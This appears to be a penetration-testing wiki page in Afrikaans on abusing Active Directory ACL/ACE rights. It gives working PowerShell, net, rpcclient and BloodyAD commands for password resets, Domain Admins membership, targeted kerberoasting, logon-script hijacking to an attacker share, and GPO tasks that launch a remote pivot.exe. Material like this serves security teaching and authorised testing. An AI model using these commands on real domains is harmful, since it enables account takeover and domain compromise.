# Misbruik van Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie blad is hoofsaaklik 'n opsomming van die tegnieke van** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, kyk na die oorspronklike artikels.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Hierdie voorreg gee 'n aanvaller volle beheer oor 'n geteikende gebruikersrekening. Sodra `GenericAll` regte bevestig is met die `Get-ObjectAcl`-opdrag, kan 'n aanvaller:

- **Verander die geteikende gebruiker se wagwoord**: Deur `net user <username> <password> /domain` te gebruik, kan die aanvaller die gebruiker se wagwoord terugstel.
- **Targeted Kerberoasting**: Ken 'n SPN toe aan die gebruiker se rekening om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT) hashes te onttrek en te probeer kraak.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Skakel pre-authentication uit vir die gebruiker, wat hul rekening kwesbaar maak vir ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Regte op Groep**

Hierdie voorreg stel 'n aanvaller in staat om groepslidmaatskappe te manipuleer as hulle `GenericAll`-regte op 'n groep soos `Domain Admins` het. Nadat hulle die groep se distinguished name met `Get-NetGroup` geïdentifiseer het, kan die aanvaller:

- **Voeg hulself by die `Domain Admins`-groep**: Dit kan gedoen word met direkte opdragte of deur modules soos Active Directory of PowerSploit te gebruik.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Vanaf Linux kan jy ook BloodyAD gebruik om jouself by ewekansige groepe te voeg wanneer jy GenericAll/Write-lidmaatskap oor hulle het. As die teikengroep in “Remote Management Users” genesteer is, sal jy onmiddellik WinRM-toegang kry op hosts wat daardie groep eerbiedig:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Om hierdie voorregte op 'n rekenaarobjek of 'n gebruikersrekening te hê, laat toe:

- **Kerberos Resource-based Constrained Delegation**: Laat toe om 'n rekenaarobjek oor te neem.
- **Shadow Credentials**: Gebruik hierdie tegniek om as 'n rekenaar of gebruikersrekening op te tree deur die voorregte te misbruik om shadow credentials te skep.

## **WriteProperty on Group**

As 'n gebruiker `WriteProperty`-regte het op alle objekte vir 'n spesifieke groep (bv. `Domain Admins`), kan hulle:

- **Voeg hulself by die Domain Admins Group**: Deur die `net user` en `Add-NetGroupUser` opdragte te kombineer, laat hierdie metode privilege escalation binne die domein toe.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Hierdie voorreg stel aanvalers in staat om hulself by spesifieke groepe te voeg, soos `Domain Admins`, deur opdragte te gebruik wat groeplidmaatskap direk manipuleer. Die volgende opdragreeks maak selftoevoeging moontlik:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

'n Gelykwaardige reg: dit stel aanvallers in staat om hulself direk by groepe te voeg deur die eienskappe van die groep te wysig as hulle die `WriteProperty` reg op daardie groepe het. Die bevestiging en uitvoering van hierdie reg word gedoen met:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Om die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` te hê, maak dit moontlik om wagwoorde terug te stel sonder om die huidige wagwoord te ken. Verifiëring van hierdie reg en die uitbuiting daarvan kan deur middel van PowerShell of alternatiewe opdragreël-gereedskap gedoen word, en bied verskeie metodes om 'n gebruiker se wagwoord te herstel, insluitend interaktiewe sessies en eenreël-opdragte vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalsvektore demonstreer.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner op Groep**

As 'n aanvaller ontdek dat hulle `WriteOwner`-regte oor 'n groep het, kan hulle die eienaarskap van daardie groep na hulself verander. Dit is veral ingrypend wanneer die betrokke groep `Domain Admins` is, aangesien die verandering van eienaarskap 'n breër beheer oor groepskenmerke en lidmaatskap moontlik maak. Die proses behels om die korrekte objek te identifiseer via `Get-ObjectAcl` en dan `Set-DomainObjectOwner` te gebruik om die eienaar te wysig, hetsy deur SID of naam.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite op Gebruiker**

Hierdie toestemming laat 'n aanvaller toe om gebruiker-eienskappe te wysig. Spesifiek, met `GenericWrite`-toegang kan die aanvaller die pad van die aanmeldskrip van 'n gebruiker verander om 'n kwaadwillige skrip uit te voer wanneer die gebruiker aanmeld. Dit word bereik deur die `Set-ADObject`-opdrag te gebruik om die `scriptpath`-eienskap van die teiken-gebruiker op te dateer sodat dit na die aanvaller se skrip wys.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n credential object, die gebruik daarvan om gebruikers by 'n groep te voeg of te verwyder, en die verifikasie van die lidmaatskapveranderinge met PowerShell-opdragte.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Om 'n AD object te besit en `WriteDACL`-privilegies daarop te hê, stel 'n aanvaller in staat om hulself `GenericAll`-privilegies oor die object toe te ken. Dit word gedoen deur ADSI-manipulasie, wat volle beheer oor die object en die vermoë om sy groepslidmaatskappe te verander, toelaat. Desondanks bestaan daar beperkings wanneer hierdie privilegies probeer uitgebruik word met die Active Directory-module se `Set-Acl` / `Get-Acl` cmdlets.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replisering op die Domein (DCSync)**

Die DCSync-aanval gebruik spesifieke repliseringspermisse op die domein om 'n Domain Controller na te boots en data, insluitend gebruikersbewyse, te sinkroniseer. Hierdie kragtige tegniek vereis permissies soos `DS-Replication-Get-Changes`, wat aanvallers toelaat om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-delegasie

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur kan beduidende sekuriteitsrisiko's inhou. Byvoorbeeld, as 'n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer is, kan hulle voorregte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie permissies kan vir kwaadwillige doeleindes misbruik word, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-permissies opspoor

Om verkeerd gekonfigureerde GPOs te identifiseer, kan PowerSploit se cmdlets aan mekaar gekoppel word. Dit maak die ontdekking van GPOs wat 'n spesifieke gebruiker mag bestuur moontlik: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars met 'n gegewe beleid toegepas**: Dit is moontlik om te bepaal op watter rekenaars 'n spesifieke GPO van toepassing is, wat help om die omvang van die potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleid(e) toegepas op 'n gegewe rekenaar**: Om te sien watter beleide op 'n bepaalde rekenaar toegepas word, kan opdragte soos `Get-DomainGPO` gebruik word.

**OUs met 'n gegewe beleid toegepas**: Die identifisering van organisatoriese eenhede (OUs) wat deur 'n gegewe beleid geraak word, kan gedoen word met `Get-DomainOU`.

Jy kan ook die instrument [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te opspoor en probleme daarin te vind.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPOs kan uitgebuit word om kode uit te voer, byvoorbeeld deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gebruik word om 'n gebruiker by die plaaslike administrators-groep op aangetaste masjiene te voeg, wat die voorregte aansienlik verhoog:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Die GroupPolicy module, as dit geïnstalleer is, maak die aanmaak en koppel van nuwe GPOs moontlik, en die instel van voorkeure soos registry values om backdoors op aangetaste rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker by die rekenaar aanmeld vir uitvoering:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse bied 'n metode om bestaande GPOs te misbruik deur take by te voeg of instellings te wysig sonder die behoefte om nuwe GPOs te skep. Hierdie tool vereis dat bestaande GPOs gewysig word of dat RSAT tools gebruik word om nuwe GPOs te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Beleid-opdatering afdwing

GPO-opdaterings gebeur gewoonlik ongeveer elke 90 minute. Om hierdie proses te versnel, veral nadat 'n verandering geïmplementeer is, kan die `gpupdate /force`-opdrag op die teikenrekenaar gebruik word om 'n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPOs toegepas word sonder om vir die volgende outomatiese opdateringsiklus te wag.

### Onder die enjinkap

By inspeksie van die Geskeduleerde Take vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur skripte of opdragreël-gereedskap wat daarop gemik is om stelselgedrag te verander of om voorregte te eskaleer.

Die struktuur van die taak, soos getoon in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer is, beskryf die besonderhede van die geskeduleerde taak — insluitend die opdrag wat uitgevoer moet word en die triggers daarvan. Hierdie lêer verteenwoordig hoe geskeduleerde take binne GPOs gedefinieer en bestuur word, en bied 'n metode om arbitrêre opdragte of skripte as deel van beleidsafdwinging uit te voer.

### Gebruikers en Groepe

GPOs laat ook toe om gebruikers- en groepledemaatskappe op teikenstelsels te manipuleer. Deur die Users and Groups-beleidlêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe voeg, soos die plaaslike `administrators`-groep. Dit is moontlik deur die delegasie van GPO-bestuurspermsies, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groepledemaatskappe te verander.

Die XML-konfigurasielêer vir Users and Groups beskryf hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers verhoogde voorregte oor getroffenen stelsels toegeken word. Hierdie metode bied 'n direkte benadering tot die eskalering van voorregte deur middel van GPO-manipulasie.

Boonop kan aanvullende metodes oorweeg word om kode uit te voer of persistenie te handhaaf, soos die gebruik van logon/logoff-skripte, die wysiging van registersleutels vir autoruns, die installering van sagteware via .msi-lêers, of die redigering van dienskonfigurasies. Hierdie tegnieke bied verskeie weë om toegang te behou en teikenstelsels te beheer deur die misbruik van GPOs.

## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
